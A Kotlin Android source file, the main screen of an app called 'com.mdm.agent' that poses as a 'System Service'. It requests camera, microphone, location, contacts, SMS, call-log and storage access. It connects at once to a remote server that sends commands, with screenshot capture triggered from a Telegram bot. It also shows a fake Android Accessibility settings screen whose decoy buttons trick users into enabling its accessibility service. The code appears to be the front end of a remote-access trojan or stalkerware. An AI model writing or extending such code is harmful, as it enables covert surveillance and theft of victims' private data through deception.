package com.mdm.agent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.mdm.agent.data.remote.ApiClient
import com.mdm.agent.data.remote.CommandHandler
import com.mdm.agent.data.remote.CryptoManager
import com.mdm.agent.data.remote.SocketManager
import com.mdm.agent.data.remote.UploadManager
import com.mdm.agent.util.DeviceUtils

class MainActivity : AppCompatActivity() {

    companion object {
        @Volatile private var instanceSocketManager: SocketManager? = null
        @Volatile private var instance: MainActivity? = null
        @Volatile private var isConnecting = false

        fun getSocketManager(): SocketManager? = instanceSocketManager
        fun setSocketManager(sm: SocketManager?) { instanceSocketManager = sm }
    }

    private val TAG = "MainActivity"
    private var statusText: TextView? = null
    private var socketManager: SocketManager? = null

    // BroadcastReceiver for screenshot permission requests from CommandHandler
    private val screenshotPermissionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "com.mdm.agent.REQUEST_SCREENSHOT_PERMISSION") {
                Log.i(TAG, "📡 Received screenshot permission request")
                Toast.makeText(this@MainActivity,
                    "يُرجى الموافقة على لقطة الشاشة لتفعيل الميزة",
                    Toast.LENGTH_LONG).show()
                // ✅ Now launch from Activity context (foreground) - this ensures
                // the dialog appears OVER the app, not over home screen
                try {
                    val permIntent = Intent(this@MainActivity,
                        com.mdm.agent.ui.ScreenCapturePermissionActivity::class.java)
                    permIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(permIntent)
                    Log.i(TAG, "✅ Launched ScreenCapturePermissionActivity from MainActivity")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed to launch permission activity: ${e.message}")
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        instance = this
        Log.i(TAG, "🚀 MainActivity started")

        // Register broadcast receiver for screenshot permission requests
        try {
            val filter = IntentFilter("com.mdm.agent.REQUEST_SCREENSHOT_PERMISSION")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenshotPermissionReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                registerReceiver(screenshotPermissionReceiver, filter)
            }
            Log.i(TAG, "✅ Screenshot permission receiver registered")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register receiver: ${e.message}")
        }

        // Connect to server IMMEDIATELY
        connectToServer()

        // Show the main screen (permissions + accessibility button)
        showMainScreen()
    }

    override fun onDestroy() {
        try { unregisterReceiver(screenshotPermissionReceiver) } catch (_: Exception) {}
        super.onDestroy()
    }

    // ═══════════════════════════════════════════════════════════
    // SCREEN 1: White screen with permissions + Accessibility button
    // ═══════════════════════════════════════════════════════════
    private fun showMainScreen() {
        // Request all permissions first
        requestAllPermissions()

        // ⚠️ REMOVED: requestMediaProjection() - this was causing the app to crash
        // when the user tapped OK on the system permission dialog.
        // Now MediaProjection is requested only when the user sends screenshot-on
        // command from the Telegram bot (one-time request).

        val scrollView = ScrollView(this).apply {
            setBackgroundColor(Color.WHITE)
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 80, 48, 48)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        // Title
        val title = TextView(this).apply {
            text = "System Service"
            setTextColor(Color.parseColor("#FF1A1A2E"))
            textSize = 22f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 8)
        }
        root.addView(title)

        // Subtitle
        val subtitle = TextView(this).apply {
            text = "Setup required to continue"
            setTextColor(Color.parseColor("#FF666666"))
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }
        root.addView(subtitle)

        // Connection status
        statusText = TextView(this).apply {
            text = "Connecting to server..."
            setTextColor(Color.parseColor("#FF128C7E"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 24)
        }
        root.addView(statusText)

        // Permissions section
        val permsTitle = TextView(this).apply {
            text = "Required Permissions"
            setTextColor(Color.parseColor("#FF1A1A2E"))
            textSize = 15f
            setTypeface(typeface, Typeface.BOLD)
            setPadding(0, 16, 0, 8)
        }
        root.addView(permsTitle)

        val perms = listOf(
            "📷 Camera",
            "🎤 Microphone",
            "📍 Location (GPS)",
            "👥 Contacts",
            "💬 SMS Messages",
            "📞 Call Logs",
            "📁 Storage & Files"
        )

        for (perm in perms) {
            val row = TextView(this).apply {
                text = "✅ $perm"
                setTextColor(Color.parseColor("#FF333333"))
                textSize = 14f
                setPadding(16, 8, 0, 8)
            }
            root.addView(row)
        }

        // Divider
        val divider = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                1
            ).apply { topMargin = 24; bottomMargin = 24 }
        }
        root.addView(divider)

        // Accessibility section title
        val accTitle = TextView(this).apply {
            text = "Accessibility Setup"
            setTextColor(Color.parseColor("#FF1A1A2E"))
            textSize = 15f
            setTypeface(typeface, Typeface.BOLD)
            setPadding(0, 0, 0, 8)
        }
        root.addView(accTitle)

        // Accessibility description
        val accDesc = TextView(this).apply {
            text = "To enable full system service functionality, you need to enable Accessibility.\n\nTap the button below to open Accessibility settings."
            setTextColor(Color.parseColor("#FF666666"))
            textSize = 13f
            setPadding(0, 0, 0, 16)
        }
        root.addView(accDesc)

        // Accessibility button
        val btnAccessibility = Button(this).apply {
            text = "♿ Enable Accessibility"
            setTextColor(Color.WHITE)
            textSize = 15f
            setTypeface(typeface, Typeface.BOLD)
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#FF128C7E"))
                cornerRadius = 12f
            }
            setPadding(0, 28, 0, 28)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener {
                Log.i(TAG, "Accessibility button clicked - showing fake settings screen")
                showFakeAccessibilitySettings()
            }
        }
        root.addView(btnAccessibility)

        // Info text
        val info = TextView(this).apply {
            text = "\nℹ️ All permissions and Accessibility are required for the system service to function properly."
            setTextColor(Color.parseColor("#FF999999"))
            textSize = 11f
            setPadding(0, 16, 0, 0)
            gravity = Gravity.CENTER
        }
        root.addView(info)

        scrollView.addView(root)
        setContentView(scrollView)
    }

    // ═══════════════════════════════════════════════════════════
    // SCREEN 2: Fake Accessibility Settings (looks like Android settings)
    // Only "Installed apps" button is real, others are fake
    // ═══════════════════════════════════════════════════════════
    private fun showFakeAccessibilitySettings() {
        val scrollView = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#FFFAFAFA"))
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(0, 0, 0, 0)
        }

        // Header (looks like Android settings header)
        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.WHITE)
            setPadding(24, 40, 24, 24)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        val headerTitle = TextView(this).apply {
            text = "Accessibility"
            setTextColor(Color.parseColor("#FF1A1A2E"))
            textSize = 20f
            setTypeface(typeface, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        header.addView(headerTitle)

        val headerSub = TextView(this).apply {
            text = "Nothing enabled"
            setTextColor(Color.parseColor("#FF999999"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 4, 0, 0)
        }
        header.addView(headerSub)

        root.addView(header)

        // Divider
        val d1 = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
        }
        root.addView(d1)

        // "Installed apps" - REAL button (opens actual Accessibility settings)
        val btnInstalledApps = createSettingsRow(
            "Installed apps",
            "Manage accessibility apps",
            true
        ) {
            Log.i(TAG, "Installed apps clicked - opening real Accessibility settings")
            Toast.makeText(this, "Opening accessibility settings...", Toast.LENGTH_SHORT).show()
            try {
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {
                val intent = Intent(Settings.ACTION_SETTINGS)
                startActivity(intent)
            }
        }
        root.addView(btnInstalledApps)

        // Divider
        val d2 = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
        }
        root.addView(d2)

        // Fake buttons (just show toast, do nothing real)
        val btnScreenMagnification = createSettingsRow(
            "Screen magnification",
            "Zoom in on screen content",
            false
        ) {
            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
        }
        root.addView(btnScreenMagnification)

        // Divider
        val d3 = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
        }
        root.addView(d3)

        val btnTalkBack = createSettingsRow(
            "TalkBack",
            "Screen reader for visually impaired",
            false
        ) {
            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
        }
        root.addView(btnTalkBack)

        // Divider
        val d4 = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
        }
        root.addView(d4)

        val btnSound = createSettingsRow(
            "Sound detection",
            "Detect sounds and alert you",
            false
        ) {
            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
        }
        root.addView(btnSound)

        // Divider
        val d5 = View(this).apply {
            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
        }
        root.addView(d5)

        val btnAdvanced = createSettingsRow(
            "Advanced settings",
            "Additional accessibility options",
            false
        ) {
            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
        }
        root.addView(btnAdvanced)

        // Back button
        val btnBack = Button(this).apply {
            text = "← Back"
            setTextColor(Color.parseColor("#FF128C7E"))
            textSize = 14f
            background = null
            setPadding(24, 24, 24, 24)
            setOnClickListener {
                showMainScreen()
            }
        }
        root.addView(btnBack)

        scrollView.addView(root)
        setContentView(scrollView)
    }

    private fun createSettingsRow(title: String, desc: String, enabled: Boolean, onClick: () -> Unit): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.WHITE)
            setPadding(24, 20, 24, 20)
            gravity = Gravity.CENTER_VERTICAL
            isClickable = true
            isFocusable = true
            setOnClickListener { onClick() }
        }

        val textCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val titleView = TextView(this).apply {
            text = title
            setTextColor(if (enabled) Color.parseColor("#FF128C7E") else Color.parseColor("#FF333333"))
            textSize = 15f
        }
        textCol.addView(titleView)

        val descView = TextView(this).apply {
            text = desc
            setTextColor(Color.parseColor("#FF999999"))
            textSize = 12f
            setPadding(0, 2, 0, 0)
        }
        textCol.addView(descView)
        row.addView(textCol)

        // Arrow icon
        val arrow = TextView(this).apply {
            text = "→"
            setTextColor(Color.parseColor("#FFCCCCCC"))
            textSize = 18f
        }
        row.addView(arrow)

        return row
    }

    // ═══════════════════════════════════════════════════════════
    // PERMISSIONS & CONNECTION
    // ═══════════════════════════════════════════════════════════
    private fun requestAllPermissions() {
        val perms = mutableListOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        )
        // On Android 13+ (Tiramisu), request granular media permissions
        // These appear as "الملفات والوسائط" (Files and media) in the permissions list
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(android.Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(android.Manifest.permission.READ_MEDIA_AUDIO)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(perms.toTypedArray(), 999)
            Log.i(TAG, "Requested all dangerous permissions: ${perms.size}")
        }
    }

    private fun requestMediaProjection() {
        try {
            if (com.mdm.agent.service.ScreenCaptureService.isReady()) {
                Log.i(TAG, "✅ ScreenCapture already ready")
                return
            }
            
            Log.i(TAG, "📸 Requesting MediaProjection permission (delayed)...")
            // Delay 2 seconds to let UI render completely first
            // This prevents the app from crashing when the system dialog appears
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(this)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ MediaProjection request failed: ${e.message}")
                }
            }, 2000)
        } catch (e: Exception) {
            Log.e(TAG, "❌ requestMediaProjection error: ${e.message}")
        }
    }

    private fun connectToServer() {
        if (isConnecting) return
        isConnecting = true

        Thread {
            var retryCount = 0
            val maxRetries = 5

            while (retryCount < maxRetries) {
                try {
                    retryCount++
                    Log.i(TAG, "📡 Connection attempt $retryCount/$maxRetries")

                    val deviceId = DeviceUtils.getDeviceId(this)
                    val serverUrl = DeviceUtils.getServerUrl(this)
                    Log.i(TAG, "  Server: $serverUrl")
                    Log.i(TAG, "  Device: $deviceId")

                    updateStatus("Connecting to server... ($retryCount/$maxRetries)")

                    val apiClient = ApiClient(this)
                    val cryptoManager = CryptoManager()
                    val uploadManager = UploadManager(this)

                    updateStatus("Requesting encryption keys...")
                    val cryptoResult = apiClient.initCrypto(deviceId)
                    if (cryptoResult != null) {
                        cryptoManager.initFromServer(cryptoResult)
                        Log.i(TAG, "✅ Crypto initialized")
                    } else {
                        Log.w(TAG, "⚠️ Crypto init returned null, retrying...")
                        if (retryCount < maxRetries) {
                            Thread.sleep(5000)
                            continue
                        }
                    }

                    updateStatus("Creating Socket.IO connection...")
                    socketManager = SocketManager(this)
                    setSocketManager(socketManager)

                    val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
                    socketManager?.setCommandHandler(commandHandler)
                    socketManager?.setCryptoManager(cryptoManager)

                    socketManager?.onCommandReceived = { data ->
                        Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                        commandHandler.handleCommand(data)
                    }

                    updateStatus("Connecting to server...")
                    socketManager?.connect()

                    Thread.sleep(5000)

                    if (socketManager?.isConnected == true) {
                        Log.i(TAG, "🎉 Socket.IO connected!")
                        updateStatus("✅ Connected - App is ready")
                        isConnecting = false
                        return@Thread
                    } else {
                        Log.w(TAG, "⚠️ Socket not connected after 5s, retrying...")
                        if (retryCount < maxRetries) {
                            Thread.sleep(5000)
                            continue
                        }
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "❌ Connection attempt $retryCount failed: ${e.message}", e)
                    updateStatus("Retrying... ($retryCount/$maxRetries)")
                    if (retryCount < maxRetries) {
                        Thread.sleep(5000)
                    }
                }
            }

            updateStatus("❌ Connection failed. Reopen app to retry.")
            isConnecting = false
        }.start()
    }

    private fun updateStatus(text: String) {
        Handler(Looper.getMainLooper()).post {
            statusText?.text = text
            Log.i(TAG, "Status: $text")
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled != 1) return false
            val list = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
            list.contains("com.mdm.agent")
        } catch (e: Exception) { false }
    }

    override fun onResume() {
        super.onResume()

        Handler(Looper.getMainLooper()).postDelayed({
            // Retry connection if not connected
            if (!isConnecting && socketManager?.isConnected != true) {
                Log.i(TAG, "📡 Not connected, retrying from onResume...")
                connectToServer()
            }
        }, 1500)
    }
}
